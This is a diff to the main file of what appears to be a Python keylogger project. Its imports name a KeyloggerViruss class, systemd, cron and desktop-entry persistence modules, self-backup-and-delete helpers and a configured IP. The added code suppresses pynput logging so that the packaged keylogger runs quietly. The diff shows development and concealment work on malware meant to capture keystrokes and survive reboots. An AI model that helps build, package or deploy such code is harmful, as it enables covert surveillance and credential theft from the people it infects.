@@ -12,6 +12,7 @@ It also creates a backup of itself before executing the keylogger functionality.
 import os
 import sys
 import argparse
+import logging
 from pathlib import Path
 from config import IP, BACKUP_DIR, LIST_NEW_FILES
 from utils import get_file_name, _md5_of_file, self_backup_and_delete, create_dirs_if_not_exists, remove_roots_ownership
@@ -19,6 +20,29 @@ from persistance.setup_systemd import install_systemd_service, create_unit_conte
 from persistance.setup_cron import create_bash_content, install_cron_job
 from persistance.setup_desktop_entry import install_desktop_entry, create_wrapper_script
 from keylogger import KeyloggerViruss
+
+
+# ===== FIX FOR PYINSTALLER + PYNPUT =====
+if getattr(sys, 'frozen', False):
+    # Force initialize logging before pynput tries to use it
+    logging.basicConfig(
+        level=logging.CRITICAL,  # Suppress most logs
+        format='%(message)s',
+        handlers=[logging.StreamHandler()]
+    )
+    
+    # Manually create logger hierarchy that pynput expects
+    pynput_logger = logging.getLogger('pynput')
+    pynput_logger.setLevel(logging.CRITICAL)
+    
+    keyboard_logger = logging.getLogger('pynput.keyboard')
+    keyboard_logger.setLevel(logging.CRITICAL)
+    
+    # Prevent pynput from trying to configure logging
+    import pynput
+    if hasattr(pynput, '_logger'):
+        pynput._logger = keyboard_logger
+
 
 def main():
     # ----- parse CLI args -----
